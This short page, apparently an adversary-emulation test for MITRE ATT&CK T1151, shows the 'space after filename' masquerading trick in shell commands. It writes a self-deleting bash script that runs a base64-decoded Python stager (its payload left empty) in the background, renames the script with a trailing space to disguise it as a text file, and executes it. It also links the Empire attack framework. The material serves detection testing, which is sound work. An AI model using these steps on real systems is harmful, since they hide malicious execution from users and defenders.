# Space After Filename

MITRE ATT&CK Technique: [T1151](https://attack.mitre.org/wiki/Technique/T1151)

### Generate Binary 
    echo '#!/bin/bash\necho "import sys,base64,warnings;warnings.filterwarnings(\"ignore\");exec(base64.b64decode(\"\"));" | /usr/bin/python &\nrm -f "$0"\nexit' > shell.txt && chmod +x shell.txt

### Add Space After Filename
    mv shell.txt "shell.txt "

### Execute
    ./shell.txt\ 

https://github.com/EmpireProject/Empire
